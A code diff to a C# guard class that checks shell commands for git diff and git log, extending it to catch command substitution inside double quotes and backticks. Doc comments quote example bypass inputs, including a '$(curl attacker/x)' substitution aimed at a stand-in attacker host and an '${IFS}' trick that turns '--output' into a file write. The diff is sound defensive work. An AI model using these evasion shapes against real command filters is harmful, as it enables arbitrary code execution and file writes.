@@ -110,27 +110,37 @@ public static class GitReadOnlyGuardRoutes
 
     /// <summary>
     /// Whether the command contains an unquoted brace group with a comma (bash brace expansion,
-    /// e.g. <c>{/dev/null,~/.config/gh/hosts.yml}</c>, or <c>-{-output=&lt;path&gt;,-stat}</c>) or a
+    /// e.g. <c>{/dev/null,~/.config/gh/hosts.yml}</c>, or <c>-{-output=&lt;path&gt;,-stat}</c>), a
     /// bare, unquoted <c>$</c> (parameter, command, or arithmetic expansion — <c>${IFS}</c>,
-    /// <c>$(...)</c>, a plain <c>$IFS</c>) outside a fully single-quoted word. Both build or split a
-    /// refused flag or path only once bash itself runs the command, after every text-based check
-    /// above has already looked at the unexpanded text and found nothing (independent pre-PR
-    /// review, cycle 8, adversarial lens; lesson 4a5df6e3): <c>git diff --output${IFS}/tmp/pwn</c>
-    /// never contains a literal <c>--output</c> followed by <c>=</c>, whitespace, or end of string,
-    /// so <see cref="OutputFlag"/> misses it, yet bash splits it into <c>--output /tmp/pwn</c>, a
-    /// form git accepts. Verified in a throwaway repository: each shape wrote or read its file
-    /// exactly as the unquoted, unexpanded form does.
+    /// <c>$(...)</c>, a plain <c>$IFS</c>) outside a fully single-quoted word, or a command
+    /// substitution — <c>$(...)</c> or a backtick pair — anywhere it actually runs, including inside
+    /// a <c>"..."</c> span. The first two build or split a refused flag or path only once bash
+    /// itself runs the command, after every text-based check above has already looked at the
+    /// unexpanded text and found nothing (independent pre-PR review, cycle 8, adversarial lens;
+    /// lesson 4a5df6e3): <c>git diff --output${IFS}/tmp/pwn</c> never contains a literal
+    /// <c>--output</c> followed by <c>=</c>, whitespace, or end of string, so <see cref="OutputFlag"/>
+    /// misses it, yet bash splits it into <c>--output /tmp/pwn</c>, a form git accepts. Command
+    /// substitution is a different danger entirely: it runs an arbitrary command as a side effect
+    /// regardless of quoting, so <c>git diff --format="$(curl attacker/x)"</c> and
+    /// <c>git diff --format=\`curl attacker/x\`</c> execute the embedded command the moment bash
+    /// runs the line, even though neither ever produces a literal <c>--output</c> or absolute path
+    /// for the flag regexes to see (independent pre-PR review, cycle 9, adversarial lens). Verified
+    /// in a throwaway repository: each shape wrote or read its file, or ran its command, exactly as
+    /// the unquoted, unexpanded form does.
     /// <para>
     /// This runs on the raw command text, not the reassembled one <see cref="UnescapeShellQuoting"/>
     /// produces: a <c>$'...'</c> or <c>$"..."</c> lead-in is quoting syntax, not an expansion (its
     /// own <c>$</c> is skipped over here the same way that method decodes it, rather than counted),
-    /// and text inside a <c>'...'</c> or <c>"..."</c> span is skipped rather than inspected — quoting
-    /// suppresses brace expansion entirely, and a double-quoted <c>$</c> still expands but without
-    /// the word-splitting or pathname expansion that makes the unquoted form dangerous, so it costs
-    /// nothing to leave it alone. This is gated by <see cref="GitLogOrDiff"/> matching the
-    /// reassembled text, so it only fires on a command that already reads as <c>git diff</c>/<c>git
-    /// log</c> once quoting is accounted for, never on the term appearing only inside an unrelated
-    /// quoted value.
+    /// and text inside a <c>'...'</c> or <c>$'...'</c> span is skipped rather than inspected — both
+    /// suppress every expansion, command substitution included, with no exception. A <c>"..."</c>
+    /// span is different: double quotes suppress the word-splitting and pathname expansion that make
+    /// a bare <c>$IFS</c> or brace group dangerous, so a plain <c>$</c> or <c>{...,...}</c> inside one
+    /// costs nothing to leave alone, but they do not suppress command substitution at all — bash
+    /// still runs a <c>$(...)</c> or backtick pair inside a double-quoted string, quoting only
+    /// changes what happens to its output — so the span's content is scanned for one rather than
+    /// skipped outright. This is gated by <see cref="GitLogOrDiff"/> matching the reassembled text,
+    /// so it only fires on a command that already reads as <c>git diff</c>/<c>git log</c> once
+    /// quoting is accounted for, never on the term appearing only inside an unrelated quoted value.
     /// </para>
     /// </summary>
     private static bool HasUnquotedExpansion(string command)
@@ -153,7 +163,12 @@ public static class GitReadOnlyGuardRoutes
 
             if (current == '"')
             {
-                index = SkipPastClosingQuote(command, index + 1, '"', honorBackslash: true);
+                index = SkipDoubleQuotedSpan(command, index + 1, out bool containsCommandSubstitution);
+                if (containsCommandSubstitution)
+                {
+                    return true;
+                }
+
                 continue;
             }
 
@@ -163,7 +178,7 @@ public static class GitReadOnlyGuardRoutes
                 continue;
             }
 
-            if (current == '$')
+            if (current == '`' || current == '$')
             {
                 return true;
             }
@@ -221,6 +236,38 @@ public static class GitReadOnlyGuardRoutes
         while (index < command.Length && command[index] != quoteChar)
         {
             index += honorBackslash && command[index] == '\\' && index + 1 < command.Length ? 2 : 1;
+        }
+
+        return index < command.Length ? index + 1 : command.Length;
+    }
+
+    /// <summary>
+    /// Scans a <c>"..."</c> span the same way <see cref="SkipPastClosingQuote"/> does, and also
+    /// reports whether the span contains a command substitution — a backtick, or a <c>$</c>
+    /// immediately followed by <c>(</c> — that bash still runs even though the surrounding quotes
+    /// suppress word-splitting on its output (independent pre-PR review, cycle 9, adversarial lens):
+    /// unlike the bare <c>$IFS</c>/brace-expansion danger <see cref="HasUnquotedExpansion"/> exempts
+    /// double-quoted text from, a <c>$(...)</c> or backtick pair executes as a side effect regardless
+    /// of quoting, so it cannot be treated as safe just because it sits inside <c>"..."</c>.
+    /// </summary>
+    private static int SkipDoubleQuotedSpan(string command, int start, out bool containsCommandSubstitution)
+    {
+        containsCommandSubstitution = false;
+        int index = start;
+        while (index < command.Length && command[index] != '"')
+        {
+            if (command[index] == '\\' && index + 1 < command.Length)
+            {
+                index += 2;
+                continue;
+            }
+
+            if (command[index] == '`' || (command[index] == '$' && index + 1 < command.Length && command[index + 1] == '('))
+            {
+                containsCommandSubstitution = true;
+            }
+
+            index++;
         }
 
         return index < command.Length ? index + 1 : command.Length;
